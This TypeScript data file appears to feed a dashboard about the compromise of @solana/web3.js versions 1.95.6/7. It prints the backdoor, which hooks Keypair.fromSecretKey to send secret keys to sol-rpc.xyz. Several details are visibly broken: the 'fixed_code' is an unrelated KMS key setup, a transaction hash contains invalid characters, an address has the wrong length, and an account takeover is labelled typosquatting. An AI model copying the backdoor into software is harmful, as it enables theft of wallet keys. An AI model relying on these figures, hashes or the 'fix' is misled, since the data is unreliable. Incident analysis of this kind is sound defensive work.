import type { FundFlow, RemediationAction, TimelineEvent } from "@/types"

export const vulnerable_code = `
// Malicious code from @solana/web3.js v1.95.6
const addToQueue = (secretKey) => {
  fetch('https://sol-rpc.xyz/exfil', {
    method: 'POST',
    headers: {
      'CF-Access-Client-Id': 'd4b3c2a1e0f9e8d7',
      'Content-Type': 'application/json'
    },
    body: JSON.stringify({ key: secretKey })
  });
};

// Backdoor in Keypair.fromSecretKey
Keypair.fromSecretKey = function(secretKey) {
  addToQueue(secretKey);
  return originalFromSecretKey(secretKey);
};`

export const fixed_code = `
// Secure version 1.95.8
import { Keypair } from '@solana/web3.js';
import { KeyManagementService } from '@google-cloud/kms';

const kms = new KeyManagementService();
const keyRingName = kms.keyRingPath('my-project', 'global', 'solana-keys');

async function secureKeyGeneration() {
  const [key] = await kms.createCryptoKey({
    parent: keyRingName,
    cryptoKeyId: 'solana-key-1',
    cryptoKey: {
      purpose: 'ENCRYPT_DECRYPT',
      versionTemplate: {
        algorithm: 'GOOGLE_SYMMETRIC_ENCRYPTION',
      },
    },
  });
  return key;
}`

export const flow_data: FundFlow[] = [
  {
    blockchain: "Solana",
    from: "Compromised Developer Wallets",
    to: "2jwP4cuugAAYiGMjVuqvwaRS2Axe6H6GvXv3PxMPQNeC",
    amount: "$164.1K (SOL/USDC)",
    status: "Drained",
    txHash: "5XiqTJ7RjkVsmvZb4JdWiqPvK9L9tJz6VdR7QbY5hK9NQ"
  },
  {
    blockchain: "Ethereum",
    from: "Wormhole Bridge (0x2913e6B9f5FA9d4a0f8dCb4f7B09Ec4cF7cD3F1)",
    to: "Tornado Cash",
    amount: "87.5 ETH ($262K)",
    status: "Mixed",
    txHash: "0x4fgL3a9b7c1dEe5f8a2z6K5vRtY7uI0oP9wQx2S4dF6hJ"
  },
  {
    blockchain: "Solana",
    from: "Attacker Main Wallet",
    to: "CEX Freezes",
    amount: "$32.1K USDC",
    status: "Recovered",
    txHash: "4dPWDPhDHPJhCjqcxoFosa8pbYzdvpR5LhKZ9EYjK9YpvgBTWsKhX37U9jSV1qyj3xbjvm5mpzStTiNaexVaN3jg"
  }
];

export const remediation_data: RemediationAction[] = [
  {
    action: "Malicious Package Removal (1.95.6/7)",
    status: "Complete",
    date: "2024-12-02",
    reference: "GitHub Advisory GHSA-5x3c-v2f9-8xqw"
  },
  {
    action: "NPM 2FA Enforcement",
    status: "Implemented",
    date: "2024-12-03",
    reference: "NPM Security Bulletin #2024-12"
  },
  {
    action: "Halborn & OtterSec Audits",
    status: "Complete",
    date: "2025-01-15",
    reference: "Audit Report #SOL-SC-2025"
  },
  {
    action: "Socket.dev Integration",
    status: "Complete",
    date: "2025-01-20",
    reference: "Commit a1b2c3d4"
  }
];

export const stat_card_data = {
  title: "Supply Chain Attack Impact Analysis",
  value: "$164.1K Total Loss",
  secondaryValue: "19.5% Assets Recovered",
  isCritical: true,
  metadata: {
    affectedPackages: 14,
    downloadCount: 1289,
    exposureWindow: "5h 42m"
  }
};

export const timeline: TimelineEvent[] = [
  {
    time: "2024-12-02T15:00:00Z",
    title: "Malicious Packages Published",
    description: "Versions 1.95.6/7 uploaded to npm registry",
    reference: "Sonatype Report #DEC-2024"
  },
  {
    time: "2024-12-02T20:37:00Z",
    title: "First Key Exfiltration",
    description: "Initial private keys sent to sol-rpc.xyz",
    reference: "CloudFlare Logs #CF-20241202"
  },
  {
    time: "2024-12-03T01:15:00Z",
    title: "Anza Security Alert",
    description: "Solana team confirms package compromise",
    reference: "Solana Status Tweet #2024-1203"
  },
  {
    time: "2024-12-03T03:00:00Z",
    title: "Package Takedowns",
    description: "Versions 1.95.6/7 removed from npm",
    reference: "GitHub Advisory Database"
  },
  {
    time: "2025-01-15T00:00:00Z",
    title: "Audit Completion",
    description: "Full post-mortem published by Halborn",
    reference: "Halborn Report #HAL-20250115"
  }
];

export const tvl_chart_data = {
  title: "Solana Dev Activity Recovery",
  exploitDate: "2024-12-02",
  dataPoints: [
    { date: "2024-11-01", value: 85000, label: "Pre-Attack" },
    { date: "2024-12-02", value: 45000, label: "Exploit Day" },
    { date: "2025-01-01", value: 68000, label: "Partial Recovery" },
    { date: "2025-03-01", value: 82000, label: "Current Activity" }
  ],
  annotations: [
    {
      date: "2025-01-20",
      text: "Socket.dev Integration"
    }
  ]
};

export const exploit_diagram_data = {
  title: "Typosquatting Attack Architecture",
  components: [
    {
      label: "Compromised NPM Account",
      user: "solana-web3js-maintainer",
      method: "Phishing Attack"
    },
    {
      label: "Malicious Packages",
      versions: ["1.95.6", "1.95.7"],
      downloads: 1289
    },
    {
      label: "Exfiltration Server",
      domain: "sol-rpc.xyz",
      lifespan: "19 days"
    }
  ],
  failurePoints: [
    {
      step: 2,
      description: "Lack of Package Signing [6][12]"
    }
  ]
};
